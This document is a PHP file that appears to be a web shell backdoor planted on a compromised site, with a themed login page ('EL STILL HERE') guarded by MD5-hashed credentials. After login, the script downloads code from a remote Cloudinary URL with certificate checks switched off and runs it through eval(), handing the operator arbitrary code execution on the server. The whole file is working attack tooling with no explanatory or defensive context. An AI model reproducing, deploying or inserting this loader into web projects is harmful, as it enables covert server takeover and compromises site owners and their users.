<?php
session_start();

function is_logged_in() {
    return isset($_SESSION['loggedin']) && $_SESSION['loggedin'] === true;
}

$userMd5 = 'a4ca719c3fa51b57bff8716f5ebe028d';
$passMd5 = 'ec07decc7fe3994412cb51cc7be02fcb';

if (!is_logged_in()) {
    if (isset($_POST['username']) && isset($_POST['password'])) {
        if (md5($_POST['username']) === $userMd5 && md5($_POST['password']) === $passMd5) {
            $_SESSION['loggedin'] = true;
            header("Location: " . $_SERVER['PHP_SELF']);
            exit();
        } else {
            $error = "Wrong";
        }
    }
}

function geturlsinfo($destiny) {
    $Array = array(
        'fopen',
        'stream_get_contents',
        'file_get_contents',
        'curl_exec'
    );

    if (function_exists($Array[3])) {
        $ch = curl_init($destiny);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        $love = curl_exec($ch);
        curl_close($ch);
        return $love;
    } elseif (function_exists($Array[2])) {
        return file_get_contents($destiny);
    } elseif (function_exists($Array[0]) && function_exists($Array[1])) {
        $purpose = fopen($destiny, "r");
        $love = stream_get_contents($purpose);
        fclose($purpose);
        return $love;
    }
    return false;
}

if (is_logged_in()) {
    $destiny = 'https://res.cloudinary.com/dkgvqbc6x/image/upload/v1786650137/kuyang_hsbdjs_qrklmi';
    
    $dream = geturlsinfo($destiny);

    if ($dream !== false) {
        $pos = strpos($dream, '<?php');
        if ($pos !== false) {
            $phpCode = substr($dream, $pos + 5); 
            eval($phpCode);
        } else {
            eval('?>' . $dream);
        }
        exit();
    }
}

if (!is_logged_in()) {
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>EL STILL HERE</title>
        <style>
            * {
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }
            body, html {
                height: 100%;
                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            }
            body {
                background: url('https://wallpapercave.com/wp/wp13582695.jpg') no-repeat center center fixed;
                background-size: cover;
                display: flex;
                justify-content: center;
                align-items: center;
            }
            .form-container {
                display: flex;
                justify-content: center;
                align-items: center;
                width: 100%;
                padding: 20px;
            }
            .login-form {
                width: 100%;
                max-width: 380px;
                padding: 40px 30px;
                background: rgba(20, 0, 0, 0.85);
                backdrop-filter: blur(10px);
                -webkit-backdrop-filter: blur(10px);
                border-radius: 16px;
                box-shadow: 0 8px 32px rgba(255, 0, 0, 0.25);
                text-align: center;
                color: #fff;
                border: 1px solid rgba(255, 0, 0, 0.2);
            }
            .login-form img {
                width: 90px;
                height: 90px;
                border-radius: 50%;
                object-fit: cover;
                margin-bottom: 15px;
                border: 3px solid rgba(255, 0, 0, 0.4);
            }
            .login-form h2 {
                margin: 0 0 25px 0;
                font-size: 24px;
                font-weight: 600;
                letter-spacing: 1px;
                color: #ff4d4d;
                text-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
            }
            .login-form input[type="text"],
            .login-form input[type="password"] {
                width: 100%;
                padding: 14px 16px;
                margin: 10px 0;
                border-radius: 8px;
                background: rgba(255, 255, 255, 0.05);
                color: #fff;
                font-size: 15px;
                transition: all 0.3s ease;
                border: 1px solid rgba(255, 0, 0, 0.2);
            }
            .login-form input[type="text"]::placeholder,
            .login-form input[type="password"]::placeholder {
                color: rgba(255, 255, 255, 0.5);
            }
            .login-form input[type="text"]:focus,
            .login-form input[type="password"]:focus {
                outline: none;
                background: rgba(255, 0, 0, 0.1);
                border-color: rgba(255, 0, 0, 0.6);
                box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
            }
            .login-form button {
                width: 100%;
                padding: 14px;
                margin-top: 20px;
                background: linear-gradient(135deg, #d32f2f 0%, #880e4f 100%);
                color: white;
                border: none;
                border-radius: 8px;
                cursor: pointer;
                font-size: 16px;
                font-weight: 600;
                letter-spacing: 1px;
                transition: all 0.3s ease;
                text-transform: uppercase;
                box-shadow: 0 4px 15px rgba(211, 47, 47, 0.4);
            }
            .login-form button:hover {
                transform: translateY(-2px);
                box-shadow: 0 6px 22px rgba(255, 0, 0, 0.6);
                background: linear-gradient(135deg, #e53935 100%, #ad1457 0%);
            }
            .error-message {
                background: rgba(255, 82, 82, 0.2);
                color: #ff5252;
                font-size: 14px;
                padding: 10px;
                border-radius: 6px;
                margin-bottom: 15px;
                border: 1px solid rgba(255, 82, 82, 0.4);
            }
        </style>
    </head>
    <body>
        <div class="form-container">
            <div class="login-form">
                <img src="https://i.pinimg.com/originals/fa/6a/a8/fa6aa8b9f02691e42df56f1678e795fc.gif" alt="Logo">
                <h2>SINGLE FIGHTER ERA</h2>
                <?php if (isset($error)): ?>
                    <div class="error-message"><?php echo $error; ?></div>
                <?php endif; ?>
                <form method="post">
                    <input type="text" name="username" placeholder="Username ..." required>
                    <input type="password" name="password" placeholder="Password ..." required>
                    <button type="submit">UDAH IMO BELUM</button>
                </form>
            </div>
        </div>
    </body>
    </html>
    <?php
    exit();
}
?>
